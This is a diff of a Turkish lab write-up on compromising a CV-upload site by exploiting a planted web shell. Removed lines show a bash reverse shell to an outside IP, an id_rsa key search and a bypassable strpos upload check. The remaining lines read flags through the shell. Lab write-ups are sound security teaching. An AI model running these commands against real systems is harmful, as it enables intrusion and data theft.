@@ -16,7 +16,7 @@ Bulunan Portlar:
 
 22/tcp: SSH (OpenSSH 8.2p1 Ubuntu)
 80/tcp: HTTP (Apache 2.4.41)
-
+<br><br><br><br>
 🔐 Web Servisine Erişim
 Tarama sonucu web sunucusunun (port 80) açık olduğunu gördük. İlk adım olarak, web sitesine erişim sağlıyoruz:
 
@@ -26,7 +26,7 @@ GÖRSEL 2: Ana web sayfası
 
 
 Web sitesi "RecruitSec" adında bir güvenlik danışmanlığı firmasının sitesi gibi görünüyor. Sayfanın alt kısmında CV yükleme formu bulunuyor.
-
+<br><br><br><br>
 🔐 Sayfa Kaynağı İncelemesi
 Web sayfalarında genellikle yorum satırları veya gizli bilgiler bırakılabilir. Sayfa kaynağına (Ctrl+U) bakarak, saldırıya veya ipuçlarına yarayacak herhangi bir bilgi var mı diye kontrol ediyoruz.
 
@@ -38,6 +38,7 @@ Sayfa kaynağında kritik bir yorum bulduk:
 
 <pre>&lt;!-- im no security expert - thats what we have a stable of nerds for - but isn't /cvs on the public website a privacy risk? --&gt;</pre>
 Bu yorum bize /cvs dizininin public olarak erişilebilir olduğunu ve potansiyel bir güvenlik riski oluşturduğunu gösteriyor.
+<br><br><br><br>
 
 🔐 Gizli Dosya ve Dizinleri Bulma
 Web sunucusunda, normalde erişim sağlanmayan veya gizli olan dizin ve dosyalar olabilir. Bunlar bazen önemli bilgiler içerebilir. Bunun için Gobuster gibi araçlarla dizin taraması yapıyoruz:
@@ -50,7 +51,7 @@ GÖRSEL 4: Gobuster tarama sonucu
 Bulunan kritik dosya:
 
 /cvs/shell.pdf.php → Başka bir hacker'ın yüklediği web shell
-
+<br><br><br><br>
 🔐 Hacker'ın Shell'ini Keşfetme
 Dizin taramasında başka bir hacker'ın yüklediği shell'i keşfettik. Bu shell'e erişim sağladık:
 
@@ -58,25 +59,23 @@ Dizin taramasında başka bir hacker'ın yüklediği shell'i keşfettik. Bu shel
 GÖRSEL 5: Shell çalıştırma sonucu 
 <img width="1036" height="552" alt="image" src="https://github.com/user-attachments/assets/2c983a24-4ba4-45ee-b3d5-8be359a73bf0" />
 
-
 Çıktı: www-data
 
 Shell çalışıyor ve bize "boom!" mesajı gösteriyor. Bu, hacker'ın shell'inin aktif olduğunu gösteriyor.
+<br><br><br><br>
 
 🔐 Sistem Keşfi
 Web shell üzerinden sistemde keşif yapmaya başladık:
+# 1. Önce /home dizinindeki kullanıcıları listele
+http://10.81.185.192/cvs/shell.pdf.php?cmd=ls+/home
 
-<pre># Home dizinindeki kullanıcıları listele http://10.81.185.192/cvs/shell.pdf.php?cmd=ls+/home # user.txt flag'ini ara http://10.81.185.192/cvs/shell.pdf.php?cmd=find+/home+-name+user.txt # Sistemdeki tüm txt dosyalarını ara http://10.81.185.192/cvs/shell.pdf.php?cmd=find+/+-name+*.txt+-type+f+2>/dev/null # SSH anahtarlarını ara http://10.81.185.192/cvs/shell.pdf.php?cmd=find+/home+-name+id_rsa+-type+f+2>/dev/null</pre>
-🔐 Flag'leri Okuma
-Bulduğumuz user ve flag dosyalarını okuduk:
+# Çıktı: kullanıcı adını gösterir (örnek: ubuntu, tryhackme, user)
 
-<pre># user.txt flag'ini oku http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/home/[KULLANICI_ADI]/user.txt # proof.txt flag'ini oku (root dizininde) http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/root/proof.txt</pre>
-🔐 Reverse Shell ile Kalıcı Erişim
-Web shell üzerinden reverse shell alarak kalıcı erişim sağladık:
+# 2. Bulduğumuz kullanıcının user.txt dosyasını oku
+http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/home/[BULUNAN_KULLANICI]/user.txt
 
-<pre># Dinleyici başlat nc -lvnp 4444 # Reverse shell tetikle http://10.81.185.192/cvs/shell.pdf.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.23.164.70/4444%200>%261'</pre>
-🔐 File Upload Zafiyeti Analizi
-Upload sayfasının kaynak kodunda zafiyetli filtreleme bulduk:
+# 3. /root dizinindeki proof.txt dosyasını oku
+http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/root/proof.txt
+<img width="1068" height="419" alt="image" src="https://github.com/user-attachments/assets/594159b2-7777-4cde-907e-2155ed94fe75" />
 
-<pre>$target_dir = "cvs/"; $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]); if (!strpos($target_file, ".pdf")) { echo "Only PDF CVs are accepted."; } else if (file_exists($target_file)) { echo "This CV has already been uploaded!"; } else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) { echo "Success! We will get back to you."; } else { echo "Something went wrong :|"; }</pre>
-Zafiyet: strpos() fonksiyonu sadece ".pdf" substring'ini arıyor, bu nedenle shell.php.pdf gibi dosyalar kabul ediliyor.
+
